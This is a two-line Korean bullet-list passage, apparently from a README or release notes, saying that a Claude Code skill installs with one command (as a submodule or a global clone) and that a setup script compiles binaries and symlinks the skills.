- Claude Code 기술로 설치되는 One-command (submodule 또는 글로벌 클론)
- `setup` 스크립트를 위한 바이너리 컴파일과 기술 symlinking
